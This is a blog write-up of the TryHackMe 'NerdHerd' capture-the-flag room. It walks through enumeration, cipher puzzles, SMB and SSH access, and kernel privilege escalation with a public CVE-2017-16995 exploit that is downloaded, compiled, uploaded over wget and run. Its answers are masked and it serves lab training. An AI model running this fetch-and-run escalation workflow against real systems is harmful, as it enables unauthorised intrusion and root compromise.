---
title: "NerdHerd_writeup"
date: 2020-11-07T02:39:20-05:00
draft: false
featured: true
toc: true
summary: "Have you ever been stuck in a rabbit hole for days? Welcome to NerdHerd!"
images:
  - "img/nerdherd_cover.jpg"
cover: "img/nerdherd_cover.gif"
tags:
  - hacking
  - tryHackme
  - writeups
  - nerdherd
---

# NerdHerd - THM Room

Welcome to another writeup, this time we'll be trying to hack a newly released room on TryHackMe called NerdHerd, inspired by the TV series Chuck!.

- Please visit This room on TryHackMe by [clicking this link](https://tryhackme.com/room/nerdherd).
- **PLEASE NOTE:** Passwords, flag values, or any kind of answers to the room questions were intentionally masked as required by THM writeups rules. 


## Getting initial access


To start things off, Let's leave `autorecon` running:

```sh
[*] Scanning target 10.10.160.23
[*] Running service detection nmap-full-tcp on 10.10.160.23
[*] Running service detection nmap-quick on 10.10.160.23
[*] Running service detection nmap-top-20-udp on 10.10.160.23
[!] Service detection nmap-top-20-udp on 10.10.160.23 returned non-zero exit code: 1
[*] Service detection nmap-quick on 10.10.160.23 finished successfully in 44 seconds
[*] Found ftp on tcp/21 on target 10.10.160.23
[*] Found ssh on tcp/22 on target 10.10.160.23
[*] Found netbios-ssn on tcp/139 on target 10.10.160.23
[!] [tcp/139/nbtscan] Scan cannot be run against tcp port 139. Skipping.
[*] Found netbios-ssn on tcp/445 on target 10.10.160.23

```

We start by checking the FTP server, we see anonymous login is enabled and we can browse around to find some files. I downloaded them to my local folder:

![](https://i.imgur.com/EVrh6bP.png)

One of the files reads `all you need is in the leet` pointing us towards the same port discovered by our scans `1337` which can be read as `leet`.

If we look at what is being served at port 1337 we get the default apache page with a little taunt in form of a popup. 

![](https://i.imgur.com/kGinlYj.png)

![](https://i.imgur.com/YIuQTq4.png)

Also at the end of the default apache page, we see a link to a video (?)

![](https://i.imgur.com/YPIclQi.png)


Looking around and after checking gobuster's results, there is an `/admin/` login form and in the HTML a possible hint:

```html
<!--
	these might help:
		Y2liYXJ0b3dza2k= : aGVoZWdvdTwdasddHlvdQ==
-->
```

On further inspection of the login form. It does not seem to return any error when trying to login and just nothing happens when trying to create a new account. This seems like a decoy.

![](https://i.imgur.com/ZFiHc13.png)


If we go back to that comment we found on the HTML, we can try to decode that and see if it reveals anything useful. We can try to use `cyberchef` to attempt to decode the data:

![](https://i.imgur.com/qTBu4LZ.png)

That seems to have worked and we do get a username of `cibartowski`. Let's see if we can do the same for the other piece of data in the comment:

![](https://i.imgur.com/oHD3Fi2.png)

I'm not sure the last decoding worked as expected. That certainly looks like a base64 encoding. This could very well be a rabbit hole.

Let's proceed further. Before, we found an image and we didn't really do anything with that. Let's see if we can find anything on it. Let's run `exifTool` on it:

![](https://i.imgur.com/n7B3xTJ.png)

If we look carefully we see that we get a file owner name of `fijbxslz`. I don't know about you but that looks a bit off. Let's see if we can find any encoding/encryption match using `cyberChef`.

After tinkering a bit with cyberchef I did not find any encoding that really produces back a string that could be a password/username(at lest they didn't look like one). I think we are missing a bit of information. I we go back to our findings we also failed to understand what information was actually trying to reveal to us that video that we found. Maybe this is in fact a cipher, and for most of those we need a `keyword` or `phrase` to decode. So, if we think about it that video could have that key. If we look the lyrics for that song:

```sh
A-well now, everybody's heard about the bird [Repeat: x 2]
About the bird, the bird, bird bird bird
(this line is backing sung throughout the song)
("Tweet tweet tweet" sung over backing)
Swingin' this dance now to hit the scene

...

And get to flappin' your wings, in the west or the east
Haven't you heard about the bird?
Don't you know that the bird's the word?
Bird, bird, bird, bird, bird
```

Could `bird` be the word we are looking for? let's try it out.

![](https://i.imgur.com/rzUDLzQ.png)

That didn't work. But it doesn't mean we are approaching this totally wrong. Let's see if we can tinker a bit more with the lyrics and see if we decode something that makes a bit of sense.

![](https://i.imgur.com/gn9Imj8.png)

That took a while, after trying a lot of combinations from the lyrics. Guess what? `birdistheword`! I mean, really. That was pretty obvious, and still I struggled for a good amount of time trying out combinations of words from that lyric. We should really have to start considering `occam's razor` more often. Lesson learned.

> Occam's razor is the principle that, of two explanations that account for all the facts, the simpler one is more likely to be correct. It is applied to a wide range of disciplines, including religion, physics, and medicine.

![](https://i.imgur.com/m43Fvx9.png)

Anyways, after a while of playing around with Cyberchef. It turns out decoding `vigenère` with that phrase from the lyrics of the song gives us a password.

At this point we need to try those out, could those be for the login form we got before? I guess we have to check it to be sure. `cibartowski:easypass` there we go. I'll spare you the pain, that didn't work. That login form just doesn't seem to work.

What else we found that we could try to log into? There was an `FTP` and an `SSH`. But `autorecon` also found some `smb shares`:

![](https://i.imgur.com/3dtqFQI.png)

Let's see if any of those work for us.

### SSH

![](https://i.imgur.com/edOuYAR.png)

That didn't work either. 

### FTP


![](https://i.imgur.com/ufxYcE6.png)

Nop, that's another nop nope.

### SMB Shares

![](https://i.imgur.com/z3wEgns.png)

Hmm that did not work either. What if we are incorrectly assuming the username we found before is the correct one. I mean, it could very well be also part of the rabbit hole. One thing we didn't do either is try to enumerate the share users. Let's see if we can do that:

![](https://i.imgur.com/dd8s114.png)

Ok, so the user we found before seems to be a decoy indeed to steer us away. After enumerating the users we see the username is actually `chuck`.

> NOTE: Don't be like me XD. If you look carefully at the results returned by autorecon which I did long AFTER doing this manually, you'll see that it already had returned us the username of `chuck`. So now you know, make sure to pay attention to all possible details and check you are not missing any details from the scan results.

Let's see if we can actually connect to the share now (we can also see if maybe chuck is a valid user for FTP and SSH):

![](https://i.imgur.com/L7GSTnH.png)

That worked, we are able to connect to that `classified` share now. And we can see there is a file in there. Let's see what it has for us:

![](https://i.imgur.com/Rn5fOXf.png)

So we get another directory to look at. Let's see if that's something we can access via browser. After all `leet is all you need`.

![](https://i.imgur.com/dunrfVd.png)

Indeed we can access that directory right from the browser. And it seems we have some other file there.

If we look at that file we get this:

![](https://i.imgur.com/AlEWsfB.png)

Ok let's see if now we can access that `ssh` or if this is another game from the room creator (which is awesome BTW, just like chuck!):

![](https://i.imgur.com/4e5nP5C.png)

That works and we finally have a foothold on this machine. If we look around a bit we see the user flag right there:

![](https://i.imgur.com/ma9NHVT.png)

## Getting root

Now that we have our initial access, let's upload linpeas.sh and see what it finds for us. For that I fire up a `python3 -m http.server 80` in a local folder where I have the script. Then we just run `wget http://{your_IP}/linpeas.sh` into a writable directory.

> Remember to `chmod +x linpeas.sh` before running it.

![](https://i.imgur.com/E73Uyfm.png)

Now we just wait for linpeas to run through and show its results back.

Right off the bat we get a possible PE vector:

![](https://i.imgur.com/83BHqOU.png)

Let's see if we can find some exploit for that linux kernel that linpeas pointed out for us, let's google!

![](https://i.imgur.com/BBC7TsD.png)

It seems we have some options, let's check the one mentioned in `exploit-db.com`:

![](https://i.imgur.com/Uh9OOfT.png)

Seems to be a script in written in C language, so we'll need to turn it into an executable file. After googling a bit I've come across this site that explains a bit on compiling C programs with `gcc`. Check that post [here](https://www3.ntu.edu.sg/home/ehchua/programming/cpp/gcc_make.html).

Let's see an extract of that post to understand how to compile the exploit we found:

![](https://i.imgur.com/HNE5u41.png)

Seems rather simple, let's compile locally and upload it to the target machine as we did with linpeas before:

![](https://i.imgur.com/DoZ3mYW.png)

Now lets fire up a local http server again and using wget we can upload the exploit:

![](https://i.imgur.com/z0HAVw2.png)

Now we just need to run it. Fingers crossed:

![](https://i.imgur.com/0xreU9D.png)

Darn it! That did not work!...and it also crashed our session. We might need to try another one of the exploits returned for this vuln. Let's get back to google.

There is another script we can try located in [this repo](https://github.com/rlarabee/exploits/blob/master/cve-2017-16995/cve-2017-16995.c). Let's give that one a try.

We repeat the same steps as before: `compile, upload, chmod +x, execute`

![](https://i.imgur.com/MHbJDWh.png)

IT WORKS!! we are root. Effing finally. Let's see where that damn flag is:

![](https://i.imgur.com/MHbJDWh.png)

So we are being trolled! that got me laughing late at night (wife's not happy), well played `0xpr0N3rd`.

Ok so now we need to locate that flag, let's see if `find` command helps us here. Actually before we do that let's get an interactive shell first, since the one we got is a pain in the a**.

![](https://i.imgur.com/Pa6C2Dx.png)

Now let's see if `find` gives us a chance to go to sleep before sunrise XD:

![](https://i.imgur.com/NdLt7CD.png)

That's it! we got the root flag, finally. But the room also contains a `bonus` flag for good measure. Let's see if I have any brain left to find that before I fall asleep(it's 3:35 AM at this point).

## Getting the bonus flag


The hint for the last flag is `brings back so many memories`... Let's see if we can find that last flag by using `grep` command along with find. We'll try to look into files containing `THM` since that's probably another flag in the format of `THM{weird_random_values}`:

> You can check [this](https://stackoverflow.com/questions/16956810/how-do-i-find-all-files-containing-specific-text-on-linux) post to read about how to use find & grep for this. Beware this will take some time since we'll be searching the whole machine. We should probably try to narrow down the search.

The command looks like this: `find . -type f -exec grep -sH 'THM{' {} \; 2>/dev/null`

Spoiler: That approach is taking ages. Let's see if we can find the flag manually, we need to possibly look into logs or history files. If We look at the `.bash_history` we see a message there:

![](https://i.imgur.com/0KpzWOU.png)

This guy is teasing us! could it be that we should look into another user's history? Let's see if we can find another history file. Let's look at our own folder `root`:

![](https://i.imgur.com/AXgy6xl.png)


After we run our find command we get a match, then we just cat and grep that file looking for our magic string `THM` and voilá! We got the bonus flag!

This room really made me sweat, I was stuck on that damn rabbit hole trying to decode that `password` for days! After running out of options and even watch `Ciphey` hang trying to decode that string (The one we found in the HTML code) I got tired and started looking for other clues. And After a lot of effort and learning we were able to complete this room. Don't give up, just keep trying other things. And don't get stuck with something for days like I did. Like The Mayor says, "sometimes try harder" doesn't work and you have to find a different approach.


I hope you enjoy this room as I did, thanks to `0xpr0N3rd` for creating this very entertaining room. I'm gonna publish this writeup and hit the bed. (it's 4:47am)

Happy hacking!

{{< thm_badge >}}



















